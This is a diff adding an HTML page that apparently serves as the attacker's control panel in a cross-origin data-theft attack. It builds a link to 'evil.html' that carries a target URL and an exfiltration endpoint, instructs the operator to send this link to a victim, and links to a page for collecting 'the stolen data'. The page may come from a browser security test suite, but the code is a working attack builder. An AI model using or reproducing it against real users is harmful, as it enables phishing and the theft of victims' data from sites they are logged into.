@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<script src="/js/allfuncs.js" charset="utf-8"></script>
+		<script charset="UTF-8">
+			registerWinOnLoad(function () {
+				var doPOST = getBoolPar('post');
+				var currOrigin = getCurrOrigin();
+				// Get a new cache UUID
+				getDataViaXHR(currOrigin + '/cache/new', false, '', function (uuid) {
+					var cacheURL = currOrigin + '/cache/' + uuid;
+					setTextContent(document.getElementById('t_victimURL'),
+						currOrigin + getCurrDir() + 'evil.html' +
+							'?reqURL=' +
+							'&sendURL=' + encodeURIComponent(cacheURL) +
+							'&post=' + doPOST
+					);
+					document.getElementById('login').href = cacheURL;
+				});
+			});
+
+			function updateVictimURL () {
+				var i_targetURL = document.getElementById('i_targetURL');
+				var t_victimURL = document.getElementById('t_victimURL');
+				var targetURL = encodeURIComponent(i_targetURL.value);
+				var victimURL = getTextContent(t_victimURL).replace(
+					/reqURL=[^&]*/, 'reqURL=' + targetURL);
+				setTextContent(t_victimURL, victimURL);
+			};
+		</script>
+	</head>
+	<body>
+		<div style="margin-bottom: 10em">
+			<!-- Old browsers don't support oninput -->
+			<input onchange="updateVictimURL()" value="" type="text" style="width: 60%; height: 2em; margin: 20px" id="i_targetURL"></input>
+			<p>Here's the URL to send to the victim, adjust the target URL in the input above:</p>
+			<textarea readonly style="width: 60%; height: 5em; margin: 20px" id="t_victimURL"></textarea>
+			<br/>
+			<a id="login" href="" target="_blank">Click here to wait for the stolen data</a>
+		</div>
+		<div id="log" style="display: none"></div>
+	</body>
+</html>
